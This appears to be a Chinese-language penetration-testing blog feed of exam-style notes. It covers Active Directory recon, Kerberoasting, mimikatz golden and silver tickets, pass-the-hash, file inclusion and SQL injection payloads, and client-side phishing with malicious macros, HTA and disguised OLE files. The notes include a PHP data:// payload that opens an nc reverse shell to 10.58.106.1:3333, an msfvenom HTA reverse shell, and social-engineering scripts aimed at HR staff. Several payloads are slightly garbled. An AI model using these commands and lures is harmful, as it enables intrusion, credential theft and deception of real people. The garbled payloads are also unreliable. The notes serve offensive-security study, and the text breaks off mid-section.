class="language-bash">ps脚本PowerView收集域内信息</span></span><br><span class="line">/usr/share/windows-resources/powersploit/Recon/PowerView.ps1</span><br><span class="line">被控主机的cmd上执行，绕过win系统默认不允许powershell脚本执行的策略</span><br><span class="line">powershell.exe -ep bypass </span><br><span class="line">Import-Module PowerView.ps1</span><br><span class="line">Get-Domain # 获取域内的基本信息</span><br><span class="line">Get-DomainSID # 获取域的SID信息</span><br><span class="line">Get-DomainController # 获取域控信息</span><br><span class="line">Get-DomainComputer # 获取域内计算机的信息</span><br><span class="line">Get-NetUser # 获取域内用户的信息</span><br><span class="line">Get-NetGroup # 获取域内组的信息</span><br><span class="line">Get-NetGroup $GroupName # 获取指定组的信息</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使用bloodhound收集信息</span></span><br><span class="line">kali运行</span><br><span class="line">sudo apt install bloodhound</span><br><span class="line">sudo ne04j console #运行成功之后会给一个web地址，访问该地址进行初始化，然后挂起该终端</span><br><span class="line">另一个终端运行bloodhound，先放在一边</span><br><span class="line"></span><br><span class="line">把/usr/share/metasploit-framework/data/post/powershell/SharpHound.ps1丢到目标主机上运行</span><br><span class="line">目标机器运行Import-Module SharpHound.ps1</span><br><span class="line">Invoke-BloodHound -CollectionMethod all -OutputDirectory C:\Users\bob\Desktop\ -OutputPrefix oscp</span><br><span class="line">OutputPrefix是指定生成结果文件的文件名前缀</span><br><span class="line"></span><br><span class="line">把生成的结果文件.zip放到kali上，在bloodhound上传zip，自动生成分析结果，里面有拿到域控的最短路径分析</span><br></pre></td></tr></table></figure><p>先通过信息收集找到高权限的域账号，然后找到该账号在域内的哪一台机器上有身份认证的登录会话，然后把那一台机器上的内存信息给dump出来，就是用mimikatz</p><h2 id="AD身份认证"><a href="#AD身份认证" class="headerlink" title="AD身份认证"></a>AD身份认证</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">AD支持多种认证协议、技术，支持 Windows、Linux、MacOS系统集中认证</span><br><span class="line">大多数情况下，活动目录使用Kerberos、NTLM两种身份认证协议</span><br><span class="line">WDigest 认证协议支持 Windows 7、2008 R2等早期版本的操作系统</span><br></pre></td></tr></table></figure><p>在域中默认访问资源都是通过资源的DNS名称，某台服务器上的某个资源通过DNS名称找到目标机器，这种通过名称去访问域内的资源的话，默认走的就是Kerberos身份认证。如果在域中直接使用目标的IP去访问，默认走的就是NTLM身份认证。</p><h3 id="NTLM认证过程"><a href="#NTLM认证过程" class="headerlink" title="NTLM认证过程"></a>NTLM认证过程</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1.客户端计算用户密码，生成NTLM HASH</span><br><span class="line">2.客户端将用户名发给应用服务器</span><br><span class="line">3.应用服务器返回Nonce随机值给客户端</span><br><span class="line">4.客户端使用 NTLM HASH 加密 Nonce ，然后发回给应用服务器</span><br><span class="line">5.APP服务器将用户名+ Nonce +加密的Nonce全部发给DC</span><br><span class="line">6.DC使用用户的NTLM HASH 加密Nonce，与接收到的加密Nonce对比，相同则认证成功</span><br></pre></td></tr></table></figure><h3 id="Kerberos身份认证"><a href="#Kerberos身份认证" class="headerlink" title="Kerberos身份认证"></a>Kerberos身份认证</h3><p>Windows的Kerberos认证使用票据，DC作为密钥分发中心KDC和认证服务器AS</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">1.A是申请登录的机器，B是域控机器，C是应用服务器</span><br><span class="line"></span><br><span class="line">2.A将用户名和时间戳（时间戳是加密的）发送给B，B如果校验时间戳通过，就返回TGT（第一张票据）给A，后续A和B的通信中都会带上TGT证明A自己的身份</span><br><span class="line"></span><br><span class="line">3.A如果想访问域内的应用服务器C，A会在域内搜服务的SPN名称，告诉DC，A要找指定的SPN名称，A会去向B再要一张票据（这个请求的过程中会带上TGT），如果B找到了SPN，B就会生成第二张服务票据，服务票据是用服务账号的哈希加密的，服务票据只有C能看懂，A看不懂，A拿着第二张票据去访问C，C接收到服务票据时，会从服务票据中提取用户的身份信息，如果身份是普通用户组，就会赋予普通用户的身份访问，如果属于域管组，就会赋予管理员权限</span><br><span class="line"></span><br><span class="line">TGT中有用户名、用户属于哪些组、域相关信息、会话密钥、用户IP等，DC会用KRBTGT账号把整个TGT加密，客户端一般无法解密TGT</span><br><span class="line"></span><br><span class="line">服务票据中有A和C之间的通信密钥、用该密钥加密的用户信息（用户名、所属域组）等信息</span><br><span class="line"></span><br><span class="line">可能存在的风险：</span><br><span class="line">1.DC不校验A的权限是否有权限访问目标服务，只要A请求票据，而且A的身份是域中的正常用户，DC都会给服务票据（ST），也就是说，只要TGT正确，DC就会给ST</span><br><span class="line">2.ST会缓存在A的内存中，既然有了ST，而ST是由服务账号的哈希加密的，如果服务账号的密码是弱口令，且ST对应的数据结构已知，就可以进行爆破，一旦服务账号的密码解出来，如果服务账号属于域中的高权限用户，就控了DC</span><br><span class="line"></span><br><span class="line">攻击思路：</span><br><span class="line">1.直接密码爆破DC（前提是已经获得一台域内机器的本地管理员权限），如果域内启用密码策略用户锁定，就不能爆破太多次</span><br><span class="line"></span><br><span class="line">使用Spray-Passwords.ps1进行密码爆破（如果DC没有启动账号锁定阈值，下面这个工具会自动识别有无阈值）</span><br><span class="line"># 被控主机上运行</span><br><span class="line">.\Spray-Passwords.ps1 -File pass.txt -Admin 账号名称 # 爆破密码</span><br><span class="line">.\Spray-Passwords.ps1 -Pass 指定密码  # 密码喷洒，用固定的密码去枚举哪个账号复用了此密码</span><br><span class="line"></span><br><span class="line">2.只要用正确的账号和密码去向DC请求TGT，如果成功拿到TGT，说明账号密码就是正确的</span><br></pre></td></tr></table></figure><p>如果已经获得一个域内的用户账号密码，可以直接从Kali上向DC申请服务票据，Kali拿到服务票据的密文，然后破解，如果是弱口令，就可以拿到服务账号的密码，如果服务账号的权限很高，就拿来直接去登录DC</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sudo impacket-GetUserSPNS -request -dc-ip 172.16.8.157 oscp.com/bob</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">指定账号是bob，会返回加密的数据及服务账号</span></span><br><span class="line">将返回的数据存储为hash.txt，还是用/usr/share/wordlists/rockyou.txt.gz进行爆破</span><br><span class="line">hashcat -m 13100 hash.txt rockyou.txt --force</span><br><span class="line">如果是弱口令，就可以破解出服务账号和密码</span><br><span class="line"></span><br><span class="line">以此思路，已经拿到了服务账号和密码，就可以自己伪造一个服务票据，A自己说自己是自己是什么组，就是什么组，这样伪造的票据就是银票</span><br></pre></td></tr></table></figure><p>使用mimikatz伪造票据</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line"></span><br><span class="line">keberos::golden /sid:域的SID /domain:域名 /ptt target::sqladmin.域名（假设访问的是sqladmin）/service:MSSQL /rc4:密码的哈希值 /user:alice(声称自己是alice)</span><br></pre></td></tr></table></figure><p>另一种提权方法</p><p>假设有人使用域管账号在机器上运行了某个系统命令，则域管账户的密码的哈希已经在机器的内存中，可以被dump出来</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::</span><br><span class="line">sekurlsa::logonPasswords # 输出机器上所有的哈希</span><br><span class="line">然后可以拿到hash，使用PTH</span><br><span class="line">kali运行</span><br><span class="line">impacket-wmiexec -hashes :哈希值 账户名@IP</span><br><span class="line"></span><br><span class="line">或者可以使用伪造票据</span><br><span class="line">sekurlsa::pth /user:账号名 /domain:域名 /ntlm:哈希值 /run:powershell.exe</span><br><span class="line">会弹出一个新的powershell窗口，在新的ps窗口中已经有了伪造账号的票据，可以直接登录DC</span><br><span class="line">net use \\dc的主机名</span><br><span class="line">. \PsExec64.exe \\主机名 cmd. exe</span><br><span class="line">然后会进入DC的cmd</span><br><span class="line"></span><br><span class="line">如果已经获得了域管身份，现在就可以以域管理员身份登录域内任何一台机器</span><br><span class="line">wmic /node:DC的IP process call create &quot;cmd&quot; # cmd这里填写需要执行的命令</span><br><span class="line">这个命令不会回显，只会返回是否执行成功</span><br><span class="line"></span><br><span class="line">如果已经获得了域管身份,也可以使用winrs连接，前提是需要目标机器上开了对应服务</span><br><span class="line">winrs -r:DC的主机名 -u:用户名 -p:密码 &quot;cmd&quot;</span><br><span class="line">Powershell也可以执行</span><br><span class="line">New-PSSession -ComputerName 主机名 #会返回会话的ID号</span><br><span class="line">Enter-PSSession ID号</span><br></pre></td></tr></table></figure><p>伪造TGT</p><p>TGT是由DC上一个叫krbtgt的账号加密的，和伪造ST一样的原理，把哈希拿到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">keberos::golden /user:随便指定的用户名 /domain:域名 /sid:域的SID /krbtgt:哈希值 /ptt</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Pentest </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web漏洞的利用方式</title>
      <link href="/2024/04/08/Web%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/"/>
      <url>/2024/04/08/Web%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<p>大部分是老生常谈，这里只记补充的</p><h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><p>污染日志文件，如果知道目标主机的日志目录，比如ssh日志，这个时候去用php一句话作为用户名去连接目标主机，日志文件中就会有PHP一句话，然后再用文件包含去执行php的webshell，或者是web日志也可</p><p>前提是知道日志路径、日志路径可写、可以跨web目录去进行文件包含</p><p>或者可以在服务器上搭建一个webshell，然后文件包含去访问</p><p>Windows下文件包含要用\</p><p>有时候执行命令的get参数用？不行的话，可以试一下&amp;</p><p>%00截断，在某些情况下有效，可以在要包含的文件如&#x2F;etc&#x2F;passwd后面加上%00去截断</p><p>..&#x2F;被过滤，将..&#x2F;进行url编码，即%2e%2e%2f，或者试一下….&#x2F;</p><p>文件包含也可以结合文件上传来利用，上传一个png，png里是webshell</p><h2 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">支持明文和Base64编码数据</span><br><span class="line"></span><br><span class="line">http://10.11.0.22/menu.php?file=data:text/plain,hello world</span><br><span class="line"></span><br><span class="line">不指定文件，直接把代码当作PHP解析</span><br><span class="line">http://10.11.0.22/menu.php?file=data:text/plain,&lt;?php echo shell_exec(&quot;id&quot;)?&gt;</span><br><span class="line">data:/textiplain;base64,PD9waHAgHZhcj1zaGVsbF9leGVjKCRfROVUWydjbWQnXSk7IGVjaG8gJHZhciA/Pg==&amp;cmd=id</span><br><span class="line"></span><br><span class="line">base64编码，绕过过滤</span><br><span class="line">data://text/plain;base64,PD9waHAgJHZhcj1zaGVsbF9leGVjKCRfROVUWydjbwQnXSk7IGVjaG8gJHZhciA/Pg==&amp;cmd=rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f(/bin/sh+-i+2&gt;%261/nc+10.58.106.1+3333+&gt;/tmplf</span><br></pre></td></tr></table></figure><h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><p>‘单引号是从前往后成对匹配的</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;select * from users where username=&#x27;&#x27;&#x27; and password=&#x27;password123&#x27;&quot;;</span><br><span class="line">#最后的单引号多出来了</span><br></pre></td></tr></table></figure><p>万能密码 tom’ or 1&#x3D;1</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> name <span class="operator">=</span> <span class="string">&#x27;tom&#x27;</span> <span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span>;# <span class="string">&#x27;and password = &#x27;</span>jones<span class="string">&#x27;;</span></span><br><span class="line"><span class="string">select * from users where name = &#x27;</span>tom<span class="string">&#x27; or 1=1 LIMIT 1;#如果上一个用不了，加上LIMIT 1试一下</span></span><br></pre></td></tr></table></figure><p>先确定是不是字符型，如果返回的报错信息里有’单引号，那么很可能是字符型</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">error near &#x27;xxxxxx&#x27;&#x27;#最前面和最后面的单引号不算</span><br><span class="line">error near &#x27;&#x27;&#x27;&#x27;&#x27; </span><br><span class="line"></span><br><span class="line">如果报错是</span><br><span class="line">error near &#x27; \&#x27; &#x27;</span><br><span class="line">就是数值型，并且服务器转义</span><br></pre></td></tr></table></figure><p>可以用limit来指定要取哪一条数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">limit a,b#表示以a为起始索引，取b个</span><br></pre></td></tr></table></figure><p>然后推测后端查询语句的大概逻辑，比如这里是字符型</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> username,email <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="operator">=</span> <span class="string">&#x27;$input&#x27;</span>;</span><br><span class="line">那么就可以构造</span><br><span class="line"><span class="keyword">select</span> username,email <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="operator">=</span> <span class="string">&#x27;1 or &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span><span class="string">&#x27;;</span></span><br></pre></td></tr></table></figure><p>再使用order by推测select后面是有几个字段，即select xxx 这里的xxx有几个字段，因为后续要用联合查询去查别的表。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> fname, sname,<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span> <span class="string">&#x27;1&#x27;</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">5</span># <span class="string">&#x27; ;</span></span><br></pre></td></tr></table></figure><p>如果order by 4没报错，by 5报错了，那么就是4个字段</p><p>或者用union select也可以判断</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> fname,sname frem users <span class="keyword">where</span> id<span class="operator">=</span> <span class="string">&#x27;1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span># <span class="string">&#x27; ;</span></span><br><span class="line"><span class="string">#查数据库名</span></span><br><span class="line"><span class="string">select fname,sname frem users where id= &#x27;</span><span class="number">1</span><span class="string">&#x27; union select version(),database()# &#x27;</span> ;</span><br></pre></td></tr></table></figure><p>查指定数据库的所有表名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> fname,name <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span> <span class="string">&#x27; &#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> table_name,<span class="number">2</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;dvwa&#x27;</span>#<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure><p>查指定表的所有字段名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> fname,name <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span> <span class="string">&#x27;&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> column_name,<span class="number">2</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;dvwa&#x27;</span> <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span>#</span><br></pre></td></tr></table></figure><p>查指定数据库下的表的所有字段的数据</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> fname,name <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span> <span class="string">&#x27;&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">user</span>, password <span class="keyword">from</span> dvwa.users#</span><br></pre></td></tr></table></figure><p>读取敏感文件</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">null</span>,load_file(<span class="string">&#x27;/etc/passwd&#x27;</span>)#</span><br></pre></td></tr></table></figure><p>写入webshell</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">null</span>,&quot;php shell&quot; <span class="keyword">INTO</span> DUMPFILE <span class="string">&#x27;/var/www/htm1/shell.php&#x27;</span>#</span><br></pre></td></tr></table></figure><p>绕过服务器转义</p><p>比如注入table_schema&#x3D;’xxx’的时候报错</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">near <span class="string">&#x27;\&#x27;</span>dvwa\<span class="string">&#x27;#&#x27;</span> <span class="keyword">at</span> line <span class="number">1</span></span><br><span class="line"></span><br><span class="line">#可以用table_schema<span class="operator">=</span>database()</span><br><span class="line">#table_schema<span class="operator">=</span><span class="number">0x64767761</span>（十六进制的dvwa）</span><br></pre></td></tr></table></figure><h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><p>服务器只返回yes or no</p><p>如果提交的是1#，返回yes，提交1’#也正常返回，说明是字符型，会闭合单引号</p><p>盲注payload一般使用and逻辑</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">判断字段数，这里id值要选存在的</span><br><span class="line">id=&#x27;1&#x27; order by 3# </span><br><span class="line"></span><br><span class="line">使用union select，这里id值要选不存在的</span><br><span class="line">不能用id=&#x27;1&#x27; union select 1,2#，因为union相当于或的关系，id=&#x27;1&#x27;为true，整体一定为true，无法根据返回的yes或no来判断</span><br><span class="line"></span><br><span class="line">盲注数据库名，使用SUBSTRING(database(),1,1)，表示从第一个字符开始，取一个字符</span><br><span class="line"></span><br><span class="line">and SUBSTRING(BIN(ASCII(SUBSTRING(database(),1,1))),4,1)&gt;0#</span><br><span class="line">表示取数据库名的第一个字母，转成二进制的ASCII码，一共7位，这里判断的是第四位是否为1</span><br></pre></td></tr></table></figure><h2 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h2><p>分隔不同命令的符号有</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">; | &amp; &amp;&amp;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Pentest </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Attacking Client</title>
      <link href="/2024/04/08/AttackingClient/"/>
      <url>/2024/04/08/AttackingClient/</url>
      
        <content type="html"><![CDATA[<p>客户端攻击的主要难点是枚举目标。不变的方法仍然是主动、被动信息收集;</p><h2 id="被动客户端信息"><a href="#被动客户端信息" class="headerlink" title="被动客户端信息"></a>被动客户端信息</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1发现目标公司出口IP</span><br><span class="line">2．建立站点，诱骗目标公司员工访问，通过IP、User-Agent发现目标公司员工OS、浏览器版本</span><br><span class="line">3.通过论坛和社交媒体的图片分享获得相关信息(OS、APP、浏览器扩展、AVs)</span><br><span class="line">4.针对客户端软件版本定制攻击代码,实现反弹Shell</span><br></pre></td></tr></table></figure><h2 id="主动客户端信息收集"><a href="#主动客户端信息收集" class="headerlink" title="主动客户端信息收集"></a>主动客户端信息收集</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.与目标进行交互（演技最重要)</span><br><span class="line">2.邮件（链接、附件、文档)、社交媒体、电话社工，获取OS、APPs、AVs、浏览器插件信息</span><br></pre></td></tr></table></figure><h2 id="社工与客户端攻击"><a href="#社工与客户端攻击" class="headerlink" title="社工与客户端攻击"></a>社工与客户端攻击</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.向HR发送无法打开的简历，如 HR要求重发简历，则询问其使用的Office、OS、AV软件版本</span><br><span class="line">2.声称简历使用了高级的宏特性，使得简历更美观、易于查看，要求HR允许执行宏（宏恶意代码）</span><br></pre></td></tr></table></figure><h2 id="客户端指纹信息"><a href="#客户端指纹信息" class="headerlink" title="客户端指纹信息"></a>客户端指纹信息</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.浏览器功能特性丰富复杂，这是双刃剑，给攻击者提供更多攻击面，是首选的攻击目标</span><br><span class="line">2.诱骗被攻击者访问攻击者搭建的网站，以此了解自标OS、浏览器版本信息</span><br><span class="line">3.利用JavaScript收集客户端信息(Fingerprintjs2)</span><br></pre></td></tr></table></figure><p>使用Fingerprintjs2获取客户端指纹信息</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cd /var/www/html/ </span><br><span class="line">sudo wget https://github.com/fingerprintjs/fingerprintjs/archive/2.1.4.zip</span><br><span class="line">sudo unzip 2.1.4.zip</span><br><span class="line">sudo mv fingerprintjs-2.1.4/fp/&amp;&amp; cd fp</span><br><span class="line">vi index.html# fingerprint2.html</span><br></pre></td></tr></table></figure><p>自动构造钓鱼链接的地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://canarytokens.com/generate</span><br></pre></td></tr></table></figure><h2 id="HTA程序"><a href="#HTA程序" class="headerlink" title="HTA程序"></a>HTA程序</h2><p>将HTML扩展名改为.hta，IE会将其作为HTML应用程序解析执行</p><p>在浏览器之外运行，使用mshta.exe 执行此程序</p><p>兼容ActiveX等遗留技术，支持JavaScript、VBScript脚本，可执行任意程序</p><p>此攻击方式只对IE、Edge有效(poc.hta)</p><p>msf生成文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/shell_reverse_tcp LHOST=10.1.8.1 LPORT=4444 -f hta-psh -o e.hta</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">-nop (-NoProfile)指示PowerShell 不要加载用户配置文件（默认配置影响代码执行，因此禁用)</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">-w hidden (-WindowStyle hidden))禁止在用户桌面打开新窗口</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">-e (-EncodedCommand) Base64编码的Powershell脚本</span></span><br></pre></td></tr></table></figure><h2 id="利用office"><a href="#利用office" class="headerlink" title="利用office"></a>利用office</h2><p>利用客户端日常使用的受信软件漏洞，攻击更隐蔽、成功概率更高</p><p>利用宏执行VBA代码，VBA是全功能的脚本语言，支持Activex、Windows脚本主机</p><p>安装Office 2016，创建Word 文档，添加宏</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">视图→宏→宏名→位置→创建→编辑→代码</span><br><span class="line"></span><br><span class="line">宏默认不会运行，因此添加开启文档时自动执行宏的指令</span><br><span class="line"></span><br><span class="line">文档保存为.doc或 .docm(避免使用docx)</span><br></pre></td></tr></table></figure><p>被攻击者需要启用宏，代码才会成功执行</p><h3 id="对象链接与嵌入（out-of-time）"><a href="#对象链接与嵌入（out-of-time）" class="headerlink" title="对象链接与嵌入（out of time）"></a>对象链接与嵌入（out of time）</h3><p>利用动态数据交换(Dynamic Data Exchange — DDE)从Office文档中执行任意程序（2017年官方已经修复）</p><p>利用Object Linking and Embedding (OLE)嵌入文档对象</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">嵌入批处理文件（虽然古老，但功能全支持)</span><br><span class="line">launch.bat = START cmd.exe</span><br><span class="line">插入→对象→由文件创建→launch.bat →显示为图标→更改图标→选择Excel文件图标→题注（Readme.xls)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Pentest </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>File Uploading And Downloading</title>
      <link href="/2024/04/08/FileUploadAndDownload/"/>
      <url>/2024/04/08/FileUploadAndDownload/</url>
      
        <content type="html"><![CDATA[<p>后渗透阶段需要往目标主机上上传文件或者需要目标主机从外部下载文件</p><h2 id="非交互式shell的升级"><a href="#非交互式shell的升级" class="headerlink" title="非交互式shell的升级"></a>非交互式shell的升级</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">攻击主机上依次执行</span><br><span class="line"></span><br><span class="line">python -c <span class="string">&quot;import pty; pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br><span class="line">然后ctrl+Z将进程放置到后台运行</span><br><span class="line">stty raw -echo</span><br><span class="line">运行fg将后台的进程拉起</span><br><span class="line">export SHELL=/<span class="built_in">bin</span>/bash</span><br><span class="line">export TERM=screen</span><br><span class="line">stty rows <span class="number">40</span> columns <span class="number">120</span></span><br><span class="line">reset</span><br></pre></td></tr></table></figure><h2 id="Linux系统文件传输"><a href="#Linux系统文件传输" class="headerlink" title="Linux系统文件传输"></a>Linux系统文件传输</h2><p>nc、wget、curl等，相对容易</p><h2 id="win系统传文件"><a href="#win系统传文件" class="headerlink" title="win系统传文件"></a>win系统传文件</h2><h3 id="使用原生FTP命令进行下载"><a href="#使用原生FTP命令进行下载" class="headerlink" title="使用原生FTP命令进行下载"></a>使用原生FTP命令进行下载</h3><p>Windows系统默认包含FTP客户端程序(交互式程序)，-s参数可指定包含FTP指令的源文件实现非交互式传文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 